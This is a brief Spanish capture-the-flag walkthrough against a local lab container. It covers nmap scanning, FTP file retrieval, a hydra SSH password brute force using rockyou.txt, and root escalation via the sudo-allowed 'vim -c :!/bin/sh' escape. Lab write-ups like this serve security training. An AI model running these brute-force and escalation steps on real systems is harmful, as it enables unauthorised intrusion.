Fecha: 07/08/2024
Escaneo con nmap:
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

Lo primero que hago es comprobar si alguna de las versiones de los servicios encontrados es vulnerable (no) usando searchsploit 

![](Imágenes/Pasted%20image%2020240807180332.png)

Veo que hay unos ficheros en el ftp, así que me los descargo:

```
ftp ftp://172.17.0.2 
get pendientes.txt
get chat-gonza.txt
```

![](Imágenes/Pasted%20image%2020240807180657.png)

Miro el archivo y veo el nombre "russoski". Con hydra y el diccionario rockyou.txt, busco su contraseña (iloveme)

![](Imágenes/Pasted%20image%2020240807181119.png)

```
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Me conecto por ssh, y haciendo `sudo -l` veo que puedo ejecutar /usr/bin/vim con permisos de superusuario. 

![](Imágenes/Pasted%20image%2020240807181720.png)

Busco en gtfobin y veo que haciendo el siguiente comando me convierto en root:

```
sudo vim -c ':!/bin/sh'
```

![](../Fáciles/Imágenes/Pasted%20image%2020240807181815.png)
